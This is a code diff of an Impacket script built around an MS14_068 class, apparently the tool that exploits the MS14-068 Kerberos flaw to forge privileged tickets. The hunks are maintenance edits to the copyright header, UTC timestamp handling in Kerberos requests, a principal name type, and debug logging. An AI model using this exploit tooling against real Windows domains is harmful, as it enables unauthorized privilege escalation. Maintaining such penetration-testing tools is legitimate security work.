@@ -1,9 +1,7 @@
 #!/usr/bin/env python
 # Impacket - Collection of Python classes for working with network protocols.
 #
-# Copyright Fortra, LLC and its affiliated companies 
-#
-# All rights reserved.
+# Copyright (C) 2023 Fortra. All rights reserved.
 #
 # This software is provided under a slightly modified version
 # of the Apache Software License. See the accompanying LICENSE file
@@ -720,7 +718,7 @@ class MS14_068:
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
         reqBody['realm'] = decodedTGT['crealm'].prettyPrint()
 
-        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
+        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
@@ -746,7 +744,7 @@ class MS14_068:
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-        now = datetime.datetime.now(datetime.timezone.utc)
+        now = datetime.datetime.utcnow() 
         authenticator['cusec'] =  now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
 
@@ -982,7 +980,7 @@ class MS14_068:
                 authTime = encASRepPart['authtime']
 
                 serverName = Principal('krbtgt/%s' % self.__domain.upper(),
-                                       type=constants.PrincipalNameType.NT_SRV_INST.value)
+                                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                 tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, domain, self.__kdcHost, tgt,
                                                                              cipher, sessionKey, authTime)
 
@@ -1113,13 +1111,20 @@ if __name__ == '__main__':
     options = parser.parse_args()
 
     # Init the example's logger theme
-    logger.init(options.ts, options.debug)
+    logger.init(options.ts)
 
     domain, username, password, address = parse_target(options.target)
 
     if domain == '':
         logging.critical('Domain should be specified!')
         sys.exit(1)
+
+    if options.debug is True:
+        logging.getLogger().setLevel(logging.DEBUG)
+        # Print the Library's installation path
+        logging.debug(version.getInstallationPath())
+    else:
+        logging.getLogger().setLevel(logging.INFO)
 
     if password == '' and username != '' and options.hashes is None:
         from getpass import getpass
